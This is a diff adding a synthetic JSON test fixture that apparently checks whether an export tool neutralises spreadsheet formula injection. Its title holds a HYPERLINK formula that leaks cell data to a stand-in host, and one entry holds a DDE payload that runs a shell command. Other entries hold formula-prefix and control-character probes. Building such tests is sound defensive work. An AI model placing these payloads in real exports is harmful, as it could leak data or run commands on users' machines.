@@ -1,0 +1,84 @@
+{
+  "schema_version": "0.1.0",
+  "profile": "cnsi-core",
+  "synthetic": true,
+  "guide_id": "urn:uuid:5e1d0c3a-0000-4000-8000-00000000f0e1",
+  "revision_id": "inject-1",
+  "title": "=HYPERLINK(\"https://example.invalid/?leak=\"&A1,\"SYNTHETIC title injection\")",
+  "lifecycle": {
+    "state": "draft"
+  },
+  "document_markings": {
+    "classification": "U",
+    "banner": "UNCLASSIFIED — SYNTHETIC & TEST"
+  },
+  "entries": [
+    {
+      "kind": "element",
+      "entry_id": "eq",
+      "description": "=1+1",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "plus",
+      "description": "+1+1",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "minus",
+      "description": "-1+1",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "at",
+      "description": "@SUM(1,1)",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "tab",
+      "description": "\t=1+1",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "cr",
+      "description": "\r=1+1",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "dde",
+      "description": "=cmd|' /C calc'!A0",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "crlf",
+      "description": "Line one\r\nLine two  ",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "spaces",
+      "description": "  leading and trailing spaces  ",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "ctrl",
+      "description": "Control char \u0007 bell and _x0041_ literal",
+      "level": "U"
+    },
+    {
+      "kind": "element",
+      "entry_id": "num",
+      "description": "00123",
+      "level": "U",
+      "notes": "1.4E+5"
+    }
+  ]
+}
